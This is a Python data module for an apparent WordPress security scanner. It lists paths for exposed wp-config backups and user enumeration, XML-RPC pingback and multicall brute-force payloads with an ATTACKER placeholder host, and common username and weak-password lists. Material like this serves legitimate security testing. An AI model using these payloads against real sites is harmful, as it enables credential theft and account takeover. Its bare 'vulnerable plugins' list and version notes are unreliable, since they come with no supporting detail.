"""
WordPress-Specific Security Payloads and Checks

Comprehensive WordPress security testing including
known vulnerabilities, misconfigurations, and common attack vectors.
"""

# WordPress sensitive files and endpoints to check
WP_SENSITIVE_PATHS = [
    "/wp-config.php",
    "/wp-config.php.bak",
    "/wp-config.php.old",
    "/wp-config.php~",
    "/wp-config.php.save",
    "/wp-config.txt",
    "/wp-config.php.swp",
    "/.wp-config.php.swp",
    "/wp-config.php.orig",
    "/wp-settings.php",
    "/xmlrpc.php",
    "/wp-login.php",
    "/wp-admin/",
    "/wp-admin/install.php",
    "/wp-admin/upgrade.php",
    "/wp-admin/setup-config.php",
    "/wp-includes/",
    "/wp-content/",
    "/wp-content/debug.log",
    "/wp-content/uploads/",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/wp-content/backup-db/",
    "/wp-content/backups/",
    "/wp-cron.php",
    "/readme.html",
    "/license.txt",
    "/wp-admin/admin-ajax.php",
    "/wp-json/",
    "/wp-json/wp/v2/users",
    "/?rest_route=/wp/v2/users",
    "/feed/",
    "/?author=1",
    "/?author=2",
]

# Common vulnerable plugins to check
VULNERABLE_PLUGINS = [
    "contact-form-7",
    "elementor",
    "wpforms-lite",
    "classic-editor",
    "akismet",
    "yoast-seo",
    "wordfence",
    "jetpack",
    "woocommerce",
    "duplicator",
    "all-in-one-seo-pack",
    "updraftplus",
    "really-simple-ssl",
    "w3-total-cache",
    "wp-super-cache",
    "slider-revolution",
    "revslider",
    "layerslider",
    "nextgen-gallery",
    "gravityforms",
    "wp-file-manager",
    "easy-wp-smtp",
    "wp-statistics",
    "loginizer",
    "mailchimp-for-wp",
]

# Plugin paths to check
def generate_plugin_paths(plugin_name: str) -> list:
    """Generate common paths for a plugin."""
    return [
        f"/wp-content/plugins/{plugin_name}/",
        f"/wp-content/plugins/{plugin_name}/readme.txt",
        f"/wp-content/plugins/{plugin_name}/README.txt",
        f"/wp-content/plugins/{plugin_name}/changelog.txt",
        f"/wp-content/plugins/{plugin_name}/CHANGELOG.txt",
    ]


# XML-RPC attack payloads
XMLRPC_PAYLOADS = {
    "list_methods": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>""",
    "pingback": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>http://ATTACKER/test</string></value></param>
        <param><value><string>http://TARGET/</string></value></param>
    </params>
</methodCall>""",
    "multicall_amplification": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>wp.getUsersBlogs</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>admin</string></value>
                                                <value><string>PASSWORD</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>""",
}

# Common WordPress usernames to check
COMMON_WP_USERNAMES = [
    "admin",
    "administrator",
    "wordpress",
    "wp",
    "root",
    "user",
    "test",
    "demo",
    "guest",
    "webmaster",
    "editor",
    "author",
]

# Common weak passwords for testing
COMMON_WP_PASSWORDS = [
    "admin",
    "password",
    "123456",
    "12345678",
    "wordpress",
    "admin123",
    "password123",
    "letmein",
    "welcome",
    "qwerty",
]

# WordPress REST API endpoints for user enumeration
WP_REST_ENDPOINTS = [
    "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/users?per_page=100",
    "/wp-json/wp/v2/posts",
    "/wp-json/wp/v2/pages",
    "/wp-json/wp/v2/media",
    "/wp-json/wp/v2/comments",
    "/wp-json/wp/v2/settings",
    "/wp-json/",
    "/?rest_route=/wp/v2/users",
    "/?rest_route=/",
]

# WordPress version detection patterns
WP_VERSION_PATTERNS = [
    r'<meta name="generator" content="WordPress ([0-9.]+)"',
    r'ver=([0-9.]+)',
    r'"version":"([0-9.]+)"',
    r'WordPress ([0-9.]+)',
]

# Known vulnerable WordPress versions (major security issues)
KNOWN_VULNERABLE_WP_VERSIONS = {
    "4.7": "REST API Content Injection (CVE-2017-1001000)",
    "4.7.1": "REST API Content Injection (CVE-2017-1001000)",
    "5.0": "Multiple XSS vulnerabilities",
    "5.0.0": "Multiple XSS vulnerabilities",
    "4.9.8": "Object Injection vulnerability",
}

# WordPress security misconfigurations
WP_MISCONFIGURATIONS = {
    "directory_listing": [
        "/wp-content/uploads/",
        "/wp-content/plugins/",
        "/wp-content/themes/",
        "/wp-includes/",
    ],
    "debug_enabled": [
        "/wp-content/debug.log",
    ],
    "user_enumeration": [
        "/?author=1",
        "/wp-json/wp/v2/users",
    ],
    "xmlrpc_enabled": [
        "/xmlrpc.php",
    ],
    "readme_exposed": [
        "/readme.html",
    ],
}

# Signatures for WordPress detection
WP_SIGNATURES = [
    "/wp-content/",
    "/wp-includes/",
    "wp-emoji",
    "WordPress",
    "wp-json",
    "xmlrpc.php",
]
